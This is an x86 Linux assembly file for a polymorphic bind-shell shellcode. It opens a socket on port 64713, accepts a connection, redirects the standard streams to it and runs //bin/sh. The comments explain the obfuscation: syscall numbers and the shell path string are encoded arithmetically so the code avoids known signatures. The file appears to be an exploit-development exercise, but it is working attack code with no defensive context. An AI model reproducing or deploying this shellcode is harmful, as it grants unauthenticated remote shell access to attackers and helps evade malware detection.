global _start
section .text
_start:
    ; instead of initializing ebx and edx separately, let's
    ; set eax, ebx, and edx to zero in two instructions
    xor ebx, ebx
    mul ebx

    ; throughout, instead of setting eax to 0x66 with just a
    ; push/pop sequence, set eax to 0xFF and XOR with 0x99
    sub  al, 0x1      ; if al is 0x0, subtracting 0x1 sets it to 0xFF
    xor  al, 0x99

    push   ebx
    inc    ebx
    push   ebx
    push   0x2
    mov    ecx, esp
    int    0x80       ; socket(2)

    xchg esi, eax     ; can't assume anything about esi here
    xor  eax, eax
    pop  ebx          ; pop 2 / push 2
    push ebx          ; instead of incrementing
    push edx          ; 0
    sub  al, 0x1      ; 0xff
    xor  al, 0x99     ; 0x66
    push word 0xc9fc  ; port 64713; instead of pushing 0xc9fc02ff
    push bx           ; split it into to pushes
    mov    ecx, esp
    push   0x10
    push   ecx
    push   esi
    mov    ecx, esp
    int    0x80        ; bind(2)

    sub    al,  0x1
    xor    al,  0x99
    push   0x4
    pop    ebx         ; don't inc, just push/pop
    int    0x80        ; listen(2)

    sub    al, 0x1
    xor    al, 0x99
    push edx
    push   esi
    mov    ecx, esp
    inc    ebx
    int    0x80        ; accept(2)

    xchg   eax, ebx
    push   0x4
    pop    ecx         ; set ecx to 0x4 cuz why not?
    dec    ecx         ; but make it 3 before entering loop
loop:
    dec    ecx
    mov byte al, 0x3f  ; instead of a push/pop, just mov
    int    0x80        ; dup2(2)
    jne    loop

    mul    ecx
    ;xor    eax, eax
    mov    al, 0xb
    push   ecx
    ; use the string "//bin/sh" in lieu of "/bin//sh"
    ; for additional obfuscation we make note of
    ; 0x68732f6e (sh/n) being even and 0x0bb59377 (ib//)
    ; being a multiple of 9
    ; ebx and edi are available for facilitating all this
    xchg   eax, edi
    mov  eax, 0x343997b7 ; "sh/n" / 2
        mov  bl, 0x2
        mul  ebx
        push eax
    mov  eax, 0x0bb59377 ; "ib//" / 9
        add  bl, 0x7
        mul  ebx
        push eax
    xchg   eax, edi
    mov    ebx, esp
    push   edx
    mov    edx, esp
    push   ebx
    mov    ecx, esp
    int    0x80        ; execve(2)

